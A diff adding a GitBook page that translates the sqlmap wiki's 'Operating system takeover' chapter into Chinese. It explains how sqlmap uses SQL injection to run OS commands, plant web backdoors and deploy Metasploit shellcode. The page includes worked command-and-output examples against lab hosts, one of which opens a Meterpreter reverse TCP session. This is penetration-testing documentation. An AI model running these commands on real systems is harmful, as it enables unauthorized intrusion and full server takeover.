@@ -1,0 +1,813 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>接管操作系统 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="Windows-registry-access.html" />
+    
+    
+    <link rel="prev" href="File-system-access.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    文档介绍
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../Users-manual.html">
+            
+                <a href="../Users-manual.html">
+            
+                    
+                    用户手册
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../Introduction.html">
+            
+                <a href="../Introduction.html">
+            
+                    
+                    介绍
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../Techniques.html">
+            
+                <a href="../Techniques.html">
+            
+                    
+                    技术
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../Features.html">
+            
+                <a href="../Features.html">
+            
+                    
+                    特性
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="../Download-and-update.html">
+            
+                <a href="../Download-and-update.html">
+            
+                    
+                    下载更新
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6" data-path="../Dependencies.html">
+            
+                <a href="../Dependencies.html">
+            
+                    
+                    相关依赖
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7" data-path="../History.html">
+            
+                <a href="../History.html">
+            
+                    
+                    历史
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8" data-path="Usage.html">
+            
+                <a href="Usage.html">
+            
+                    
+                    用法
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.8.1" data-path="Output-verbosity.html">
+            
+                <a href="Output-verbosity.html">
+            
+                    
+                    输出详细等级
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.2" data-path="Target.html">
+            
+                <a href="Target.html">
+            
+                    
+                    目标
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.3" data-path="Request.html">
+            
+                <a href="Request.html">
+            
+                    
+                    请求
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.4" data-path="Optimization.html">
+            
+                <a href="Optimization.html">
+            
+                    
+                    优化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.5" data-path="Injection.html">
+            
+                <a href="Injection.html">
+            
+                    
+                    注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.6" data-path="Detection.html">
+            
+                <a href="Detection.html">
+            
+                    
+                    检测
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.7" data-path="Techniques.html">
+            
+                <a href="Techniques.html">
+            
+                    
+                    技术
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.8" data-path="Fingerprint.html">
+            
+                <a href="Fingerprint.html">
+            
+                    
+                    指纹识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.9" data-path="Enumeration.html">
+            
+                <a href="Enumeration.html">
+            
+                    
+                    枚举
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.10" data-path="Brute-force.html">
+            
+                <a href="Brute-force.html">
+            
+                    
+                    暴力破解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.11" data-path="User-defined-function-injection.html">
+            
+                <a href="User-defined-function-injection.html">
+            
+                    
+                    用户自定义函数注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.12" data-path="File-system-access.html">
+            
+                <a href="File-system-access.html">
+            
+                    
+                    访问文件系统
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.8.13" data-path="Operating-system-takeover.html">
+            
+                <a href="Operating-system-takeover.html">
+            
+                    
+                    接管操作系统
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.14" data-path="Windows-registry-access.html">
+            
+                <a href="Windows-registry-access.html">
+            
+                    
+                    访问 Windows 注册表
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.15" data-path="General.html">
+            
+                <a href="General.html">
+            
+                    
+                    常规选项
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.16" data-path="Miscellaneous.html">
+            
+                <a href="Miscellaneous.html">
+            
+                    
+                    杂项
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.17" data-path="API.html">
+            
+                <a href="API.html">
+            
+                    
+                    API（REST-JSON）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9" data-path="../License.html">
+            
+                <a href="../License.html">
+            
+                    
+                    许可证
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="../../Miscellaneous/Miscellaneous.html">
+            
+                <a href="../../Miscellaneous/Miscellaneous.html">
+            
+                    
+                    杂项
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="../../Miscellaneous/FAQ.html">
+            
+                <a href="../../Miscellaneous/FAQ.html">
+            
+                    
+                    FAQ
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3" data-path="../../Miscellaneous/Presentations.html">
+            
+                <a href="../../Miscellaneous/Presentations.html">
+            
+                    
+                    展示
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.4" data-path="../../Miscellaneous/Screenshots.html">
+            
+                <a href="../../Miscellaneous/Screenshots.html">
+            
+                    
+                    截图
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.5" data-path="../../Miscellaneous/Third-party-libraries.html">
+            
+                <a href="../../Miscellaneous/Third-party-libraries.html">
+            
+                    
+                    第三方库
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >接管操作系统</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="&#x63A5;&#x7BA1;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;">&#x63A5;&#x7BA1;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</h1>
+<blockquote>
+<p><em>&#x8BD1;&#x81EA;&#xFF1A;<a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage#operating-system-takeover" target="_blank">Operating system takeover</a></em></p>
+</blockquote>
+<h2 id="&#x8FD0;&#x884C;&#x4EFB;&#x610F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;">&#x8FD0;&#x884C;&#x4EFB;&#x610F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;</h2>
+<p>&#x9009;&#x9879;&#x548C;&#x5F00;&#x5173;&#xFF1A;<code>--os-cmd</code> &#x548C; <code>--os-shell</code></p>
+<p>&#x5F53;&#x540E;&#x7AEF; DBMS&#xFF08;Database Management System&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF09;&#x4E3A; MySQL&#xFF0C;PostgreSQL &#x6216; Microsoft SQL Server&#xFF0C;&#x5E76;&#x4E14;&#x5F53;&#x524D;&#x4F1A;&#x8BDD;&#x7528;&#x6237;&#x62E5;&#x6709;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7279;&#x5B9A;&#x529F;&#x80FD;&#x548C;&#x76F8;&#x5173;&#x67B6;&#x6784;&#x7279;&#x6027;&#x7684;&#x5229;&#x7528;&#x6743;&#x9650;&#x65F6;&#xFF0C;sqlmap &#x80FD;&#x591F;&#x5728;<strong>&#x6570;&#x636E;&#x5E93;&#x6240;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E0A;&#x8FD0;&#x884C;&#x4EFB;&#x610F;&#x7684;&#x547D;&#x4EE4;</strong>&#x3002;</p>
+<p>&#x5728; MySQL &#x548C; PostgreSQL &#x4E2D;&#xFF0C;sqlmap &#x53EF;&#x4EE5;&#x4E0A;&#x4F20;&#xFF08;&#x901A;&#x8FC7;&#x524D;&#x9762;&#x63CF;&#x8FF0;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x529F;&#x80FD;&#xFF09;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x4E24;&#x4E2A;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x2014;&#x2014;&#x5206;&#x522B;&#x4E3A; <code>sys_exec()</code> &#x548C; <code>sys_eval()</code> &#x7684;&#x5171;&#x4EAB;&#x5E93;&#xFF08;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x521B;&#x5EFA;&#x51FA;&#x4E24;&#x4E2A;&#x5BF9;&#x5E94;&#x51FD;&#x6570;&#xFF0C;&#x5E76;&#x8C03;&#x7528;&#x5BF9;&#x5E94;&#x51FD;&#x6570;&#x6267;&#x884C;&#x7279;&#x5B9A;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x5E76;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x9009;&#x62E9;&#x662F;&#x5426;&#x6253;&#x5370;&#x51FA;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x5728; Microsoft SQL Server &#x4E2D;&#xFF0C;sqlmap &#x4F1A;&#x5229;&#x7528; <code>xp_cmdshell</code> &#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#xFF1A;&#x5982;&#x679C;&#x8BE5;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x88AB;&#x5173;&#x95ED;&#x4E86;&#xFF08;Microsoft SQL Server &#x7684; 2005 &#x53CA;&#x4EE5;&#x4E0A;&#x7248;&#x672C;&#x9ED8;&#x8BA4;&#x5173;&#x95ED;&#xFF09;&#xFF0C;sqlmap &#x5219;&#x4F1A;&#x5C06;&#x5176;&#x91CD;&#x65B0;&#x6253;&#x5F00;&#xFF1B;&#x5982;&#x679C;&#x8BE5;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;sqlmap &#x5219;&#x4F1A;&#x91CD;&#x65B0;&#x521B;&#x5EFA;&#x5B83;&#x3002;</p>
+<p>&#x5F53;&#x7528;&#x6237;&#x8BF7;&#x6C42;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF0C;sqlmap &#x5C06;&#x4F7F;&#x7528;&#x4EFB;&#x4F55;&#x53EF;&#x7528;&#x7684; SQL &#x6CE8;&#x5165;&#x6280;&#x672F;&#xFF08;&#x76F2;&#x6CE8;&#x3001;&#x5E26;&#x5185;&#x6CE8;&#x5165;&#x3001;&#x62A5;&#x9519;&#x578B;&#x6CE8;&#x5165;&#xFF09;&#x53BB;&#x83B7;&#x53D6;&#x5BF9;&#x5E94;&#x7ED3;&#x679C;&#x3002;&#x76F8;&#x53CD;&#xFF0C;&#x5982;&#x679C;&#x65E0;&#x9700;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x5BF9;&#x5E94;&#x7ED3;&#x679C;&#xFF0C;sqlmap &#x5219;&#x4F1A;&#x4F7F;&#x7528;&#x5806;&#x53E0;&#x67E5;&#x8BE2;&#x6CE8;&#x5165;&#xFF08;Stacked queries&#xFF09;&#x6280;&#x672F;&#x6267;&#x884C;&#x76F8;&#x5173;&#x7684;&#x547D;&#x4EE4;&#x3002;</p>
+<p>&#x8FD9;&#x4E9B;&#x6280;&#x672F;&#x7684;&#x76F8;&#x5173;&#x8BE6;&#x60C5;&#x53EF;&#x89C1;&#x767D;&#x76AE;&#x4E66;<a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857" target="_blank">&#x901A;&#x8FC7;&#x9AD8;&#x7EA7; SQL &#x6CE8;&#x5165;&#xFF0C;&#x5BF9;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8FDB;&#x884C;&#x5B8C;&#x5168;&#x63A7;&#x5236;</a>&#x3002;</p>
+<p>&#x9488;&#x5BF9; PostgreSQL &#x76EE;&#x6807;&#x7684;&#x793A;&#x4F8B;&#xFF1A;</p>
+<pre><code class="lang-shell">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --\
+os-cmd id -v 1
+
+[...]
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: PostgreSQL
+[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:12] [INFO] the back-end DBMS operating system is Linux
+[hh:mm:12] [INFO] testing if current user is DBA
+[hh:mm:12] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:12] [INFO] checking if UDF &apos;sys_eval&apos; already exist
+[hh:mm:12] [INFO] checking if UDF &apos;sys_exec&apos; already exist
+[hh:mm:12] [INFO] creating UDF &apos;sys_eval&apos; from the binary UDF file
+[hh:mm:12] [INFO] creating UDF &apos;sys_exec&apos; from the binary UDF file
+do you want to retrieve the command standard output? [Y/n/a] y
+command standard output:    &apos;uid=104(postgres) gid=106(postgres) groups=106(post
+gres)&apos;
+
+[hh:mm:19] [INFO] cleaning up the database management system
+do you want to remove UDF &apos;sys_eval&apos;? [Y/n] y
+do you want to remove UDF &apos;sys_exec&apos;? [Y/n] y
+[hh:mm:23] [INFO] database management system cleanup finished
+[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file sys
+tem can only be deleted manually
+</code></pre>
+<p>sqlmap &#x8FD8;&#x652F;&#x6301;&#x6A21;&#x62DF; shell &#x8F93;&#x5165;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x8F93;&#x5165;&#x4EFB;&#x610F;&#x547D;&#x4EE4;&#x4EE5;&#x6267;&#x884C;&#x3002;&#x5BF9;&#x5E94;&#x7684;&#x9009;&#x9879;&#x662F; <code>--os-shell</code>&#xFF0C;&#x5E76;&#x4E14;&#x548C; <code>--sql-shell</code> &#x4E00;&#x6837;&#xFF0C;&#x5177;&#x5907; TAB &#x8865;&#x5168;&#x548C;&#x8BB0;&#x5F55;&#x5386;&#x53F2;&#x547D;&#x4EE4;&#x7684;&#x529F;&#x80FD;&#x3002;</p>
+<p>&#x5982;&#x679C;&#x5806;&#x53E0;&#x67E5;&#x8BE2;&#x6CA1;&#x6709;&#x88AB; Web &#x5E94;&#x7528;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;PHP &#x6216; ASP &#x4E14;&#x540E;&#x7AEF; DBMS &#x4E3A; MySQL&#xFF09;&#x8BC6;&#x522B;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x4E14; DBMS &#x4E3A; MySQL&#xFF0C;&#x5047;&#x5982;&#x540E;&#x7AEF; DBMS &#x548C; Web &#x670D;&#x52A1;&#x5668;&#x5728;&#x540C;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x5219;&#x4ECD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528; <code>SELECT</code> &#x8BED;&#x53E5;&#x4E2D;&#x7684; <code>INTO OUTFILE</code>&#xFF0C;&#x5728; Web &#x670D;&#x52A1;&#x5668;&#x6839;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x53EF;&#x5199;&#x76EE;&#x5F55;&#x4E2D;&#x521B;&#x5EFA; Web &#x540E;&#x95E8;&#xFF0C;&#x4ECE;&#x800C;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x3002;sqlmap &#x652F;&#x6301;&#x4E0A;&#x8FF0;&#x529F;&#x80FD;&#x5E76;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x9017;&#x53F7;&#x5206;&#x9694;&#x3001;&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x6839;&#x76EE;&#x5F55;&#x5B50;&#x76EE;&#x5F55;&#x7684;&#x5217;&#x8868;&#xFF0C;&#x4ECE;&#x800C;&#x5C1D;&#x8BD5;&#x4E0A;&#x4F20; Web &#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x5668;&#x548C;&#x540E;&#x7EED;&#x7684; Web &#x540E;&#x95E8;&#x3002;sqlmap &#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x79CD;&#x8BED;&#x8A00;&#x7684; Web &#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x5668;&#x548C;&#x540E;&#x95E8;&#xFF1A;</p>
+<ul>
+<li>ASP</li>
+<li>ASP.NET</li>
+<li>JSP</li>
+<li>PHP</li>
+</ul>
+<h2 id="&#x6709;&#x72B6;&#x6001;&#x5E26;&#x5916;&#x8FDE;&#x63A5;&#xFF1A;meterpreter--friends">&#x6709;&#x72B6;&#x6001;&#x5E26;&#x5916;&#x8FDE;&#x63A5;&#xFF1A;Meterpreter &amp; friends</h2>
+<p>&#x5F00;&#x5173;&#x548C;&#x9009;&#x9879;&#xFF1A;<code>--os-pwn</code>&#xFF0C;<code>--os-smbrelay</code>&#xFF0C;<code>--os-bof</code>&#xFF0C;<code>--priv-esc</code>&#xFF0C;<code>--msf-path</code> &#x548C; <code>--tmp-path</code></p>
+<p>&#x5F53;&#x540E;&#x7AEF; DBMS &#x4E3A; MySQL&#xFF0C;PostgreSQL &#x6216; Microsoft SQL Server &#x65F6;&#xFF0C;&#x5E76;&#x4E14;&#x5F53;&#x524D;&#x4F1A;&#x8BDD;&#x7528;&#x6237;&#x62E5;&#x6709;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7279;&#x5B9A;&#x529F;&#x80FD;&#x548C;&#x67B6;&#x6784;&#x7F3A;&#x9677;&#x7684;&#x5229;&#x7528;&#x6743;&#x9650;&#x65F6;&#xFF0C;sqlmap &#x80FD;&#x591F;&#x5728;<strong>&#x653B;&#x51FB;&#x8005;&#x673A;&#x5668;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x8D77;&#x6709;&#x72B6;&#x6001;&#x5E26;&#x5916; TCP &#x8FDE;&#x63A5;</strong>&#x3002;&#x6839;&#x636E;&#x7528;&#x6237;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x8BE5;&#x8FDE;&#x63A5;&#x53EF;&#x4EE5;&#x662F;&#x4EA4;&#x4E92;&#x5F0F;&#x547D;&#x4EE4;&#x884C;&#x3001;Meterpreter &#x4F1A;&#x8BDD;&#x3001;&#x6216;&#x8005;&#x56FE;&#x5F62;&#x7528;&#x6237;&#x754C;&#x9762;&#xFF08;VNC&#xFF09;&#x4F1A;&#x8BDD;&#x3002;</p>
+<p>sqlmap &#x4F9D;&#x8D56; Metasploit &#x521B;&#x5EFA; shellcode&#xFF0C;&#x5E76;&#x5B9E;&#x73B0;&#x4E86;&#x56DB;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x6280;&#x672F;&#x5728;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6267;&#x884C;&#x5B83;&#x3002;&#x8FD9;&#x4E9B;&#x6280;&#x672F;&#x5206;&#x522B;&#x662F;&#xFF1A;</p>
+<ul>
+<li>&#x901A;&#x8FC7; sqlmap &#x7684;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570; <code>sys_bineval()</code> &#x5728;&#x6570;&#x636E;&#x5E93;<strong>&#x5185;&#x5B58;&#x4E2D;&#x6267;&#x884C; Metasploit shellcode</strong>&#x3002;MySQL &#x548C; PostgreSQL &#x652F;&#x6301;&#x8BE5;&#x6280;&#x672F;&#xFF0C;&#x901A;&#x8FC7;&#x5F00;&#x5173; <code>--os-pwn</code> &#x542F;&#x7528;&#x3002;</li>
+<li>&#x901A;&#x8FC7; sqlmap &#x7684;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570; <code>sys_exec()</code> &#x5411; MySQL &#x548C; PostgreSQL &#x4E0A;&#x4F20;&#x4E00;&#x4E2A; Metasploit <strong>&#x72EC;&#x7ACB; payload &#x4F20;&#x8F93;&#x5668;</strong>&#x5E76;&#x6267;&#x884C;&#xFF0C;&#x5BF9;&#x4E8E; Microsoft SQL Server &#x5219;&#x662F;&#x4F7F;&#x7528; <code>xp_cmdshell()</code> &#x51FD;&#x6570;&#xFF0C;&#x901A;&#x8FC7;&#x5F00;&#x5173; <code>--os-pwn</code> &#x542F;&#x7528;&#x3002;</li>
+<li>&#x901A;&#x8FC7;&#x8FDB;&#x884C;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5230;&#x653B;&#x51FB;&#x8005;&#x673A;&#x5668;&#xFF08;&#x7531; Metasploit <code>smb_relay</code> &#x670D;&#x52A1;&#x76D1;&#x542C;&#xFF09;&#x4E4B;&#x95F4;&#x7684; UNC &#x8DEF;&#x5F84;&#x8BF7;&#x6C42;&#x7684; <strong>SMB &#x53CD;&#x5C04;&#x653B;&#x51FB;</strong>&#xFF08;<a href="http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx" target="_blank">MS08-068</a>&#xFF09;&#x6765;&#x6267;&#x884C; Metasploit shellcode&#x3002;&#x5F53; sqlmap &#x8FD0;&#x884C;&#x4E8E;&#x5177;&#x6709;&#x9AD8;&#x6743;&#x9650;&#xFF08;<code>uid=0</code>&#xFF09;&#x7684; Linux/Unix &#x4E0A;&#xFF0C;&#x4E14;&#x76EE;&#x6807; DBMS &#x4EE5; Windows &#x7BA1;&#x7406;&#x5458;&#x8EAB;&#x4EFD;&#x8FD0;&#x884C;&#x65F6;&#x652F;&#x6301;&#x8BE5;&#x6280;&#x672F;&#xFF0C;&#x901A;&#x8FC7;&#x5F00;&#x5173; <code>--os-smbrelay</code> &#x542F;&#x7528;&#x3002;</li>
+<li>&#x901A;&#x8FC7;&#x5229;&#x7528; <strong>Microsoft SQL Server 2000 &#x548C; 2005 &#x7684; <code>sp_replwritetovarbin</code> &#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x5806;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;</strong>&#xFF08;<a href="http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx" target="_blank">MS09-004</a>&#xFF09;&#x5728;&#x6570;&#x636E;&#x5E93;&#x5185;&#x5B58;&#x4E2D;&#x6267;&#x884C; Metasploit shellcode&#x3002;sqlmap &#x4F7F;&#x7528;&#x81EA;&#x5DF1;&#x7684; exploit&#xFF0C;&#x81EA;&#x52A8;&#x7ED5;&#x8FC7; DEP &#x5185;&#x5B58;&#x4FDD;&#x62A4;&#x6765;&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;&#xFF0C;&#x4F46;&#x5B83;&#x4F9D;&#x8D56; Metasploit &#x751F;&#x6210; shellcode&#xFF0C;&#x4EE5;&#x4FBF;&#x5728;&#x6210;&#x529F;&#x5229;&#x7528;&#x65F6;&#x6267;&#x884C;&#xFF0C;&#x901A;&#x8FC7;&#x5F00;&#x5173; <code>--os-bof</code> &#x542F;&#x7528;&#x3002;</li>
+</ul>
+<p>&#x76F8;&#x5173;&#x7684;&#x6280;&#x672F;&#x8BE6;&#x60C5;&#x53EF;&#x89C1;&#x4E8E;&#x767D;&#x76AE;&#x4E66;<a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857" target="_blank">&#x901A;&#x8FC7;&#x9AD8;&#x7EA7; SQL &#x6CE8;&#x5165;&#x5B8C;&#x5168;&#x63A7;&#x5236;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</a>&#x548C;&#x5E7B;&#x706F;&#x7247;<a href="http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database" target="_blank">&#x5C06;&#x63A7;&#x5236;&#x7531;&#x6570;&#x636E;&#x5E93;&#x5C42;&#x9762;&#x62D3;&#x5C55;&#x5230;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</a>&#x3002;</p>
+<p>&#x9488;&#x5BF9; MySQL &#x76EE;&#x6807;&#x7684;&#x793A;&#x4F8B;&#xFF1A;</p>
+<pre><code class="lang-shell">$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?\
+id=1&quot; --os-pwn --msf-path /software/metasploit
+
+[...]
+[hh:mm:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003
+web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
+back-end DBMS: MySQL 5.0
+[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:31] [INFO] the back-end DBMS operating system is Windows
+how do you want to establish the tunnel?
+[1] TCP: Metasploit Framework (default)
+[2] ICMP: icmpsh - ICMP tunneling
+&gt;
+[hh:mm:32] [INFO] testing if current user is DBA
+[hh:mm:32] [INFO] fetching current user
+what is the back-end database management system architecture?
+[1] 32-bit (default)
+[2] 64-bit
+&gt;
+[hh:mm:33] [INFO] checking if UDF &apos;sys_bineval&apos; already exist
+[hh:mm:33] [INFO] checking if UDF &apos;sys_exec&apos; already exist
+[hh:mm:33] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:33] [INFO] retrieving MySQL base directory absolute path
+[hh:mm:34] [INFO] creating UDF &apos;sys_bineval&apos; from the binary UDF file
+[hh:mm:34] [INFO] creating UDF &apos;sys_exec&apos; from the binary UDF file
+how do you want to execute the Metasploit shellcode on the back-end database und
+erlying operating system?
+[1] Via UDF &apos;sys_bineval&apos; (in-memory way, anti-forensics, default)
+[2] Stand-alone payload stager (file system way)
+&gt;
+[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode
+which connection type do you want to use?
+[1] Reverse TCP: Connect back from the database host to this machine (default)
+[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535
+[3] Bind TCP: Listen on the database host for a connection
+&gt;
+which is the local address? [192.168.136.1]
+which local port number do you want to use? [60641]
+which payload do you want to use?
+[1] Meterpreter (default)
+[2] Shell
+[3] VNC
+&gt;
+[hh:mm:40] [INFO] creation in progress ... done
+[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, p
+lease wait..
+
+                                _
+                                | |      o
+_  _  _    _ _|_  __,   ,    _  | |  __    _|_
+/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |
+|  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
+                        /|
+                        \|
+
+
+    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
++ -- --=[ 674 exploits - 351 auxiliary
++ -- --=[ 217 payloads - 27 encoders - 8 nops
+    =[ svn r12272 updated 4 days ago (2011.04.07)
+
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+EXITFUNC =&gt; thread
+LPORT =&gt; 60641
+LHOST =&gt; 192.168.136.1
+[*] Started reverse handler on 192.168.136.1:60641
+[*] Starting the payload handler...
